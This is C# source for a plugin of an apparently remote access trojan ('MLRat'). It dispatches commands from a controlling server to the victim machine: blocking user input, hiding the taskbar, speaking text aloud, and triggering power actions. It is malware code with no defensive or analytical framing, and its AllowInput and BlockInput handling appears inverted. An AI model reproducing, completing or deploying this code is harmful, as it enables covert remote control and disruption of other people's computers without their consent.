using MLMiscClient.Handlers;
using MLRat.Client;
using SharedCode.Networking;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace MLMiscClient
{
    class ClientPlugin : IClientPlugin
    {
        public void OnConnect()
        {
            
        }

        public void OnDataRecieved(object[] data)
        {
            NetworkCommand command = (NetworkCommand)data[0];

            if (command == NetworkCommand.AllowInput) MiscHandler.BlockInput(true);
            if (command == NetworkCommand.BlockInput) MiscHandler.BlockInput(false);
            if (command == NetworkCommand.ShowTasbar) MiscHandler.ShowTasktray(true);
            if (command == NetworkCommand.HideTaskbar) MiscHandler.ShowTasktray(false);
            if (command == NetworkCommand.TextToSpeech) MiscHandler.TextToSpeech((string)data[1], (int)data[2]);
            if (command == NetworkCommand.ComputerPower) MiscHandler.ComputerPower((string)data[1], (int)data[2]);
        }

        public void OnDisconnect()
        {
            
        }

        public void OnPluginLoad(IClientHost server)
        {
            MiscHandler.Load();
        }
    }
}
